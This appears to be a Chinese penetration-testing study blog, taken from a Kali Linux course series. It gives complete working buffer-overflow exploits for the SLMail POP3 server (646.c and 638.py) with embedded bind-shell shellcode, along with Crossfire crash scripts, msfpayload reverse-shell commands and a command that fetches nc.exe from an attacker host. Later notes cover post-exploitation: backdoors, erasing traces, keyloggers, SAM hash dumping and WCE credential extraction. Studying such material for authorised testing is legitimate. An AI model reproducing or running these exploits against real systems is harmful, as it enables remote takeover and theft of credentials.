s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)     badchars=从0x00-0xff     buffer=&quot;A&quot;*2606+&quot;B&quot;*4+badchars       try:        print &quot;\nSending ing evil buffer...&quot;        s.connect((&apos;1.1.1.1&apos;,110))        date=s.recv(1024)        s.send(&quot;USER TEST&quot;+&apos;\r\n&apos;)        date=s.recv(1024)        s.send(&apos;PASS&apos;+buffer+&apos;\r\n&apos;)        print &quot;\nDone!&quot;     except:        print &quot;Could not connect to POP3!&quot;    <figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">    - FUZZING:</span><br><span class="line">      - 重定向数据流</span><br><span class="line">        - 用ESP的地址替换EIP的值</span><br><span class="line">        - 但是ESP地址变化,硬编码不可行</span><br><span class="line">        - SLMail 线程应用程序,操作系统为每个线程分配一段地址范围,每个线程地址范围不确定</span><br><span class="line">      - 变通思路:</span><br><span class="line">         - 在内存中寻找地址固定的系统模块</span><br><span class="line">         - 在模块中寻找JMP ESP指令的地址跳转,再由该指令间接跳转到ESP,从而执行shellcode</span><br><span class="line">         - mona.py脚本识别内存模块,搜索&quot;return address&quot;是JMP ESP指令的模块</span><br><span class="line">         - 寻找无EDP,ASLR保护的内存地址</span><br><span class="line">         - 内存地址不包含坏字符</span><br><span class="line">             mona find -s &quot;二进制地址(可使用16进制转换工具)&quot; -m xxx.dll</span><br><span class="line">         - 生成shellcode</span><br><span class="line">         - Scratch</span><br><span class="line">         - ./msfpayload -l</span><br><span class="line">![image](https://imgageblog.cdn.bcebos.com/se-05.png)</span><br><span class="line">         - ./msfpayload win32_reverse LHOST=192.168.20.8 LPORT=443 -C </span><br><span class="line">![image](https://imgageblog.cdn.bcebos.com/se-06.png)</span><br><span class="line">         - ./msfpayload win32_reverse LHOST=10.0.2.15 444 R | ./msfencode -b &quot;\x00\x0a\x0d&quot;</span><br><span class="line">         - nc -vlp 443</span><br><span class="line">         - 09.py</span><br><span class="line">              - \x90:nop指令</span><br><span class="line">              - 防止shellcode被清除前几个字节</span><br><span class="line">              - 提权侵入,拿shell</span><br><span class="line">   - shellcode执行结束后以exit方式退出整个结束,将导致邮件服务崩溃</span><br><span class="line">   - Smail是一个基于线程的应用,使用ExitThread方式可避免整个服务崩溃,可实现重复溢出</span><br><span class="line">&gt; FUZZING:远程桌面操控受控机</span><br><span class="line">   - windows:配置信息在注册表</span><br><span class="line">   - RegSnap 工具</span><br><span class="line">   - 提权后远程操控指令:</span><br><span class="line"></span><br><span class="line">&gt; Linux缓冲区溢出 - - 穿越火线缓冲区溢出</span><br><span class="line">- 1.环境搭建:</span><br><span class="line">  - Crossfire(穿越火线)</span><br><span class="line">    - 多人在线RPG游戏</span><br><span class="line">    - 1.9.0版本接受入站 scoket连接时存在缓冲区溢出漏洞</span><br><span class="line">  - 调试工具</span><br><span class="line">    - edb</span><br><span class="line">  - 运行平台</span><br><span class="line">    - Kali i486 虚拟机</span><br><span class="line">- 2.Fuzzing</span><br><span class="line">     - 新版本Linux内核会支持内存保护机制</span><br><span class="line">        - DEP</span><br><span class="line">        - ASLR</span><br><span class="line">        - 堆栈 cookies</span><br><span class="line">        - 堆栈粉碎 </span><br><span class="line">     - 本机调试</span><br><span class="line">        - ipatbles -A INPUT -p tcp --destination-port 4444 \! -d 127.0.0.1 -j DROP</span><br><span class="line">        - ipatbles -A INPUT -p tcp --destination-port 13327 \! -d 127.0.0.1 -j DROP</span><br><span class="line">     - 1.01.py</span><br></pre></td></tr></table></figure>    #!/usr/bin/python    import socket    host=&quot;127.0.0.1&quot;    #\x41 代表A 精确溢出    crash=&quot;\x41&quot;*4379      # \x11 设备操作指令 \x90 NOP指令    buffer=&quot;\x11(setup sound &quot;+ crash +&quot;\x90\x00#&quot;    # 建立连接    s=scoket.socket(socket_AF_INET,socket.SOCK_STREAM)    print &quot;[*] Sending evil buffer...&quot;    s.connect((host,13327))    data=s.recv(1024)    print data    s.send(buffer)    s.close()    print &quot;[*]Payload Sent!&quot; <figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">- 2.唯一字符串识别EIP精确位置 </span><br><span class="line">  - 02.py</span><br></pre></td></tr></table></figure>    #!/usr/bin/python    import socket    host=&quot;127.0.0.1&quot;    #\x41 代表A 精确溢出    crash=&apos;A&apos;*4368+&apos;B&apos;*4+&apos;C&apos;*7     # \x11 设备操作指令 \x90 NOP指令    buffer=&quot;\x11(setup sound &quot;+ crash +&quot;\x90\x00#&quot;    # 建立连接    s=scoket.socket(socket_AF_INET,socket.SOCK_STREAM)    print &quot;[*] Sending evil buffer...&quot;    s.connect((host,13327))    data=s.recv(1024)    print data    s.send(buffer)    s.close()    print &quot;[*]Payload Sent!&quot; <figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">   - 3.思路:shellcode代码置入</span><br><span class="line">      - 第一阶段shellcode</span><br><span class="line">         - ESP 跳转到 EAX</span><br><span class="line">         - 偏移12个字节</span><br><span class="line">      - setup sound shellcode2</span><br><span class="line">      - nasm </span><br><span class="line">          - add eax,12</span><br><span class="line">          - jmp eax</span><br><span class="line">   - 4. 查找坏字符</span><br><span class="line">       - \x00\x0a\0x0d\x20</span><br><span class="line">   - 5.shellcode</span><br><span class="line">      - ESP跳转地址</span><br><span class="line">      - 跳转该过程: EIP-&gt;jmp esp-&gt;add  eax 12-&gt;jmp eax</span><br><span class="line">      - 使用msfpayload 生成shellcode</span><br><span class="line">&gt; 选择和修改EXP</span><br><span class="line">   - 网上公开的EXP代码</span><br><span class="line">       - 选择可信赖的EXP源(虚拟环境中验证)</span><br><span class="line">       - Exploit-db</span><br><span class="line">       - SecurityFocus(安全焦点)</span><br><span class="line">       - Searchsploit</span><br><span class="line">   - 有能力修改EXP(Python,Perl,Ruby,C,C++...)</span><br><span class="line">   - 选择和修改EXP</span><br><span class="line">     - 646.C</span><br><span class="line">        - 类unix环境下编译</span><br><span class="line">        - 返回地址与本机环境不符</span><br><span class="line">        - 反弹shell硬编码回连IP地址</span><br><span class="line">        - 缓冲区偏移量与环境不符</span><br><span class="line">        - 目标IP硬编码</span><br></pre></td></tr></table></figure></code></pre><p>//646.c  SLMAIL REMOTE PASSWD BO 代码<br>// 需使用gcc进行编译 </p><p>#include &lt;string.h&gt;</p><p>#include &lt;stdio.h&gt;</p><p>#include &lt;winsock2.h&gt;</p><p>#include &lt;windows.h&gt;</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// [*] bind 4444 </span><br><span class="line">unsigned char shellcode[] = </span><br><span class="line">&quot;\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45&quot;</span><br><span class="line">&quot;\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49&quot;</span><br><span class="line">&quot;\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d&quot;</span><br><span class="line">&quot;\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66&quot;</span><br><span class="line">&quot;\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61&quot;</span><br><span class="line">&quot;\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40&quot;</span><br><span class="line">&quot;\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32&quot;</span><br><span class="line">&quot;\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6&quot;</span><br><span class="line">&quot;\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09&quot;</span><br><span class="line">&quot;\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0&quot;</span><br><span class="line">&quot;\x66\x68\x11\x5c\x66\x53\x89\xe1\x95\x68\xa4\x1a\x70\xc7\x57\xff&quot;</span><br><span class="line">&quot;\xd6\x6a\x10\x51\x55\xff\xd0\x68\xa4\xad\x2e\xe9\x57\xff\xd6\x53&quot;</span><br><span class="line">&quot;\x55\xff\xd0\x68\xe5\x49\x86\x49\x57\xff\xd6\x50\x54\x54\x55\xff&quot;</span><br><span class="line">&quot;\xd0\x93\x68\xe7\x79\xc6\x79\x57\xff\xd6\x55\xff\xd0\x66\x6a\x64&quot;</span><br><span class="line">&quot;\x66\x68\x63\x6d\x89\xe5\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89&quot;</span><br><span class="line">&quot;\xe2\x31\xc0\xf3\xaa\xfe\x42\x2d\xfe\x42\x2c\x93\x8d\x7a\x38\xab&quot;</span><br><span class="line">&quot;\xab\xab\x68\x72\xfe\xb3\x16\xff\x75\x44\xff\xd6\x5b\x57\x52\x51&quot;</span><br><span class="line">&quot;\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53&quot;</span><br><span class="line">&quot;\xff\xd6\x6a\xff\xff\x37\xff\xd0\x8b\x57\xfc\x83\xc4\x64\xff\xd6&quot;</span><br><span class="line">&quot;\x52\xff\xd0\x68\xf0\x8a\x04\x5f\x53\xff\xd6\xff\xd0&quot;;</span><br></pre></td></tr></table></figure><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">void exploit(int sock) &#123;</span><br><span class="line">      FILE *test;</span><br><span class="line">      int *ptr;</span><br><span class="line">      char userbuf[] = &quot;USER madivan\r\n&quot;;</span><br><span class="line">      char evil[3001];</span><br><span class="line">      char buf[3012];</span><br><span class="line">      char receive[1024];</span><br><span class="line">      char nopsled[] = &quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span><br><span class="line">                       &quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;;</span><br><span class="line">      memset(buf, 0x00, 3012);</span><br><span class="line">      memset(evil, 0x00, 3001);</span><br><span class="line">      memset(evil, 0x43, 3000);</span><br><span class="line">      ptr = &amp;evil;</span><br><span class="line">      ptr = ptr + 652; // 2608 </span><br><span class="line">      memcpy(ptr, &amp;nopsled, 16);</span><br><span class="line">      ptr = ptr + 4;</span><br><span class="line">      memcpy(ptr, &amp;shellcode, 317);</span><br><span class="line">      *(long*)&amp;evil[2600] = 0x7CB41010; // JMP ESP XP 7CB41020 FFE4 JMP ESP</span><br><span class="line"></span><br><span class="line">      // banner</span><br><span class="line">      recv(sock, receive, 200, 0);</span><br><span class="line">      printf(&quot;[+] %s&quot;, receive);</span><br><span class="line">      // user</span><br><span class="line">      printf(&quot;[+] Sending Username...\n&quot;);</span><br><span class="line">      send(sock, userbuf, strlen(userbuf), 0);</span><br><span class="line">      recv(sock, receive, 200, 0);</span><br><span class="line">      printf(&quot;[+] %s&quot;, receive);</span><br><span class="line">      // passwd</span><br><span class="line">      printf(&quot;[+] Sending Evil buffer...\n&quot;);</span><br><span class="line">      sprintf(buf, &quot;PASS %s\r\n&quot;, evil);</span><br><span class="line">      //test = fopen(&quot;test.txt&quot;, &quot;w&quot;);</span><br><span class="line">      //fprintf(test, &quot;%s&quot;, buf);</span><br><span class="line">      //fclose(test);</span><br><span class="line">      send(sock, buf, strlen(buf), 0);</span><br><span class="line">      printf(&quot;[*] Done! Connect to the host on port 4444...\n\n&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">int connect_target(char *host, u_short port)</span><br><span class="line">&#123;</span><br><span class="line">    int sock = 0;</span><br><span class="line">    struct hostent *hp;</span><br><span class="line">    WSADATA wsa;</span><br><span class="line">    struct sockaddr_in sa;</span><br><span class="line"></span><br><span class="line">    WSAStartup(MAKEWORD(2,0), &amp;wsa);</span><br><span class="line">    memset(&amp;sa, 0, sizeof(sa));</span><br><span class="line"></span><br><span class="line">    hp = gethostbyname(host);</span><br><span class="line">    if (hp == NULL) &#123;</span><br><span class="line">        printf(&quot;gethostbyname() error!\n&quot;); exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;[+] Connecting to %s\n&quot;, host);</span><br><span class="line">    sa.sin_family = AF_INET;</span><br><span class="line">    sa.sin_port = htons(port);</span><br><span class="line">    sa.sin_addr = **((struct in_addr **) hp-&gt;h_addr_list);</span><br><span class="line"></span><br><span class="line">    sock = socket(AF_INET, SOCK_STREAM, 0);</span><br><span class="line">    if (sock &lt; 0)      &#123;</span><br><span class="line">        printf(&quot;[-] socket blah?\n&quot;);</span><br><span class="line">        exit(0);</span><br><span class="line">        &#125;</span><br><span class="line">    if (connect(sock, (struct sockaddr *) &amp;sa, sizeof(sa)) &lt; 0)</span><br><span class="line">        &#123;printf(&quot;[-] connect() blah!\n&quot;);</span><br><span class="line">        exit(0);</span><br><span class="line">          &#125;</span><br><span class="line">    printf(&quot;[+] Connected to %s\n&quot;, host);</span><br><span class="line">    return sock;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc, char **argv)</span><br><span class="line">&#123;</span><br><span class="line">    int sock = 0;</span><br><span class="line">    int data, port;</span><br><span class="line">    printf(&quot;\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n&quot;);</span><br><span class="line">    printf(&quot;[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n&quot;);</span><br><span class="line">    if ( argc &lt; 2 ) &#123; printf(&quot;usage: slmail-ex.exe &lt;host&gt; \n\n&quot;); exit(0); &#125;</span><br><span class="line">    port = 110;</span><br><span class="line">    sock = connect_target(argv[1], port);</span><br><span class="line">    exploit(sock);</span><br><span class="line">    closesocket(sock);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"># 638.py POP3 PASS 缓冲区溢出代码</span><br><span class="line">import struct</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">print &quot;\n\n###############################################&quot;</span><br><span class="line">print &quot;\nSLmail 5.5 POP3 PASS Buffer Overflow&quot;</span><br><span class="line">print &quot;\nFound &amp; coded by muts [at] offsec.com&quot;</span><br><span class="line">print &quot;\nFor Educational Purposes Only!&quot; </span><br><span class="line">print &quot;\n\n###############################################&quot;</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sc = &quot;\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x5e\x81\x73\x17\xe0\x66&quot;</span><br><span class="line">sc += &quot;\x1c\xc2\x83\xeb\xfc\xe2\xf4\x1c\x8e\x4a\xc2\xe0\x66\x4f\x97\xb6&quot;</span><br><span class="line">sc += &quot;\x31\x97\xae\xc4\x7e\x97\x87\xdc\xed\x48\xc7\x98\x67\xf6\x49\xaa&quot;</span><br><span class="line">sc += &quot;\x7e\x97\x98\xc0\x67\xf7\x21\xd2\x2f\x97\xf6\x6b\x67\xf2\xf3\x1f&quot;</span><br><span class="line">sc += &quot;\x9a\x2d\x02\x4c\x5e\xfc\xb6\xe7\xa7\xd3\xcf\xe1\xa1\xf7\x30\xdb&quot;</span><br><span class="line">sc += &quot;\x1a\x38\xd6\x95\x87\x97\x98\xc4\x67\xf7\xa4\x6b\x6a\x57\x49\xba&quot;</span><br><span class="line">sc += &quot;\x7a\x1d\x29\x6b\x62\x97\xc3\x08\x8d\x1e\xf3\x20\x39\x42\x9f\xbb&quot;</span><br><span class="line">sc += &quot;\xa4\x14\xc2\xbe\x0c\x2c\x9b\x84\xed\x05\x49\xbb\x6a\x97\x99\xfc&quot;</span><br><span class="line">sc += &quot;\xed\x07\x49\xbb\x6e\x4f\xaa\x6e\x28\x12\x2e\x1f\xb0\x95\x05\x61&quot;</span><br><span class="line">sc += &quot;\x8a\x1c\xc3\xe0\x66\x4b\x94\xb3\xef\xf9\x2a\xc7\x66\x1c\xc2\x70&quot;</span><br><span class="line">sc += &quot;\x67\x1c\xc2\x56\x7f\x04\x25\x44\x7f\x6c\x2b\x05\x2f\x9a\x8b\x44&quot;</span><br><span class="line">sc += &quot;\x7c\x6c\x05\x44\xcb\x32\x2b\x39\x6f\xe9\x6f\x2b\x8b\xe0\xf9\xb7&quot;</span><br><span class="line">sc += &quot;\x35\x2e\x9d\xd3\x54\x1c\x99\x6d\x2d\x3c\x93\x1f\xb1\x95\x1d\x69&quot;</span><br><span class="line">sc += &quot;\xa5\x91\xb7\xf4\x0c\x1b\x9b\xb1\x35\xe3\xf6\x6f\x99\x49\xc6\xb9&quot;</span><br><span class="line">sc += &quot;\xef\x18\x4c\x02\x94\x37\xe5\xb4\x99\x2b\x3d\xb5\x56\x2d\x02\xb0&quot;</span><br><span class="line">sc += &quot;\x36\x4c\x92\xa0\x36\x5c\x92\x1f\x33\x30\x4b\x27\x57\xc7\x91\xb3&quot;</span><br><span class="line">sc += &quot;\x0e\x1e\xc2\xf1\x3a\x95\x22\x8a\x76\x4c\x95\x1f\x33\x38\x91\xb7&quot;</span><br><span class="line">sc += &quot;\x99\x49\xea\xb3\x32\x4b\x3d\xb5\x46\x95\x05\x88\x25\x51\x86\xe0&quot;</span><br><span class="line">sc += &quot;\xef\xff\x45\x1a\x57\xdc\x4f\x9c\x42\xb0\xa8\xf5\x3f\xef\x69\x67&quot;</span><br><span class="line">sc += &quot;\x9c\x9f\x2e\xb4\xa0\x58\xe6\xf0\x22\x7a\x05\xa4\x42\x20\xc3\xe1&quot;</span><br><span class="line">sc += &quot;\xef\x60\xe6\xa8\xef\x60\xe6\xac\xef\x60\xe6\xb0\xeb\x58\xe6\xf0&quot;</span><br><span class="line">sc += &quot;\x32\x4c\x93\xb1\x37\x5d\x93\xa9\x37\x4d\x91\xb1\x99\x69\xc2\x88&quot;</span><br><span class="line">sc += &quot;\x14\xe2\x71\xf6\x99\x49\xc6\x1f\xb6\x95\x24\x1f\x13\x1c\xaa\x4d&quot;</span><br><span class="line">sc += &quot;\xbf\x19\x0c\x1f\x33\x18\x4b\x23\x0c\xe3\x3d\xd6\x99\xcf\x3d\x95&quot;</span><br><span class="line">sc += &quot;\x66\x74\x32\x6a\x62\x43\x3d\xb5\x62\x2d\x19\xb3\x99\xcc\xc2&quot;</span><br><span class="line"></span><br><span class="line">#Tested on Win2k SP4 Unpatched</span><br><span class="line"># Change ret address if needed</span><br><span class="line">buffer = &apos;\x41&apos; * 4654 + struct.pack(&apos;&lt;L&apos;, 0x783d6ddf) + &apos;\x90&apos;*32 + sc </span><br><span class="line">try:</span><br><span class="line">print &quot;\nSending evil buffer...&quot;</span><br><span class="line">s.connect((&apos;192.168.1.167&apos;,110))</span><br><span class="line">data = s.recv(1024)</span><br><span class="line">s.send(&apos;USER username&apos; +&apos;\r\n&apos;)</span><br><span class="line">data = s.recv(1024)</span><br><span class="line">s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;)</span><br><span class="line">data = s.recv(1024)</span><br><span class="line">s.close()</span><br><span class="line">print &quot;\nDone! Try connecting to port 4444 on victim machine.&quot;</span><br><span class="line">except:</span><br><span class="line">print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure><blockquote><p>避免有害的EXP</p><ul><li>不同的EXP<ul><li>不同的系统补丁</li><li>软件版本</li><li>不同的offset,shellcode</li></ul></li><li>扫描探测目标系统版本,搭建适当的测试环境<ul><li>避免一锤子测试</li></ul></li><li>修改公开的EXP满足不同的环境需要<ul><li>了解漏洞原理,修改溢出代码<br>后漏洞利用阶段(POST EXPLOITATION)</li></ul></li></ul></blockquote><ul><li><p>1.漏洞利用后阶段</p><ul><li><p>上传工具</p></li><li><p>提取</p></li><li><p>擦除攻击痕迹</p></li><li><p>安装后门(木马程序)</p><ul><li>长期控制</li><li>Dump密码</li><li>内网渗透(拿到更多服务器)</li></ul></li><li><p>后漏洞利用阶段</p><ul><li>最大的挑战-防病毒软件</li><li>使用合法的远程控制软件(nc)</li></ul></li><li><p>2.上传工具之上传文件</p><ul><li>持久控制<ul><li>扩大对目标系统的控制能力</li><li>Linux系统<ul><li>netcat</li><li>curl</li><li>wget</li></ul></li><li>windos系统<ul><li>缺少预装的下载工具</li><li>一些问题解决方案:<ul><li>a.非交互式模式shell(具有局限性,需上传木马拿到交互式shell)<ul><li>类nc 远程控制shell</li><li>ftp 192.168.1.1 </li></ul></li></ul></li></ul></li><li>上传文件的方法<ul><li>使用TFTP传输文件<ul><li>xp,2003默认安装</li><li>win7,2008需要单独添加</li><li>经常被边界防火墙过滤</li></ul></li><li>使用FTP传输文件<ul><li>apt-get install pure-ftpd</li><li>ftp.sh</li></ul></li><li>使用 VBSCRIPT 传输文件<ul><li>wget.vbs</li><li>cscript wget.vbs.<a href="http://192.168.1.117/nc.exe" target="_blank" rel="noopener">http://192.168.1.117/nc.exe</a> nc.exe</li></ul></li><li>使用POWERSHELL 传输文件<ul><li>Wget.ps1</li></ul></li><li>使用DEBUG 传输文件<ul><li>Debug<ul><li>汇编,反汇编</li><li>16进制dump工具</li><li>64k字节</li></ul></li><li>upx压缩文件</li><li>wine exe2bat.exe nc.exe nx.hex</li><li>debug&lt;nc.hex</li><li>copy 1.dll nc.exe</li></ul></li></ul></li></ul></li></ul></li></ul></li></ul><h2 id="Kali-Linux-从入门到精通-十一-–提权"><a href="#Kali-Linux-从入门到精通-十一-–提权" class="headerlink" title="Kali Linux 从入门到精通(十一)–提权"></a>Kali Linux 从入门到精通(十一)–提权</h2><blockquote><p>本地提权</p><ul><li>已实现本地低权限账号登录<ul><li>远程溢出</li><li>直接获得账号密码</li></ul></li><li>希望获取更高权限<ul><li>实现对目标进一步控制</li></ul></li><li>系统之间权限隔离<ul><li>操作系统安全的基础</li><li>用户空间</li><li>内核空间</li></ul></li><li>系统账号<ul><li>用户账号登陆时获取权限令牌</li><li>服务账号无需用户登陆已在后台启动服务</li></ul></li><li>Windows<ul><li>user</li><li>Administrator</li><li>System:实质最大权限账号</li><li>注:非包含关系,交集</li></ul></li><li>Linux<ul><li>User</li><li>Root:相当于Administrator和System<br>Windows 系统提权之—-ADMIN–提取为SYSTEM</li></ul></li><li>Windos账号 <ul><li>系统设置管理功能</li><li>Sysinternal Suit<ul><li><a href="https://technet.microsoft.com/en-us/sysinternals" target="_blank" rel="noopener">https://technet.microsoft.com/en-us/sysinternals</a></li><li>psexec -i -s -d taskmgr</li></ul></li><li>at 19:39 /interactive cmd</li><li>sc Create syscmd binPath=”cmd /K start” type=own type=”interact”</li><li>sc start syscmd(系统默认以SYSTEM方式启动服务)</li></ul></li><li>注入进程提权<ul><li>隐藏痕迹</li><li>pinjector.exe<ul><li><a href="http://www.tarasco.org/security/Process_injector/" target="_blank" rel="noopener">http://www.tarasco.org/security/Process_injector/</a><br>抓包嗅探</li><li>Windows</li><li>Wireshark</li><li>Omnipeek:Windows抓包工具,界面友好</li><li>commview</li><li>Sniffpass (基于抓包密码抓取数据)</li><li>Linux</li><li>Tcpdump</li><li>Wireshark</li><li>Dsniff   (抓取密码)<br>键盘登录</li><li>Keylogger</li><li>木马窃取<br>本地缓存密码</li><li>浏览器缓存的密码</li><li>IE浏览器</li><li>Firefox</li><li>网络密码</li><li>无线密码</li><li><a href="http://www.nirsoft.net" target="_blank" rel="noopener">http://www.nirsoft.net</a></li></ul></li></ul></li></ul></blockquote><ul><li>Dump SAM(数据库)<ul><li>Pwdump(从windows的SAM中读取密文)</li><li>/usr/share/windows-binaried/fgdump/<ul><li>生成PWDUMP 文件</li><li>使用ophcrack(密码破解工具) 进行爆破<blockquote><p>Windows 身份认证过程<br><img src="https://imgageblog.cdn.bcebos.com/se-07.png" alt="image"><br><img src="https://imgageblog.cdn.bcebos.com/se-08.png" alt="image"><br><img src="https://imgageblog.cdn.bcebos.com/se-09.png" alt="image"><br>WCE(WINDOWS CREDENTIAL EDITOR)&lt;======工具(win7之前)</p></blockquote></li></ul></li></ul></li><li>/usr/share/wce/</li><li>需要管理员权限</li><li>wce-universal.exe -l / -lv</li><li>wce-universal.exe -d</li><li>wce-universal.exe -e / -r</li><li>wce-universal.exe -g</li><li>wce-universal.exe -w</li><li>LM/NT 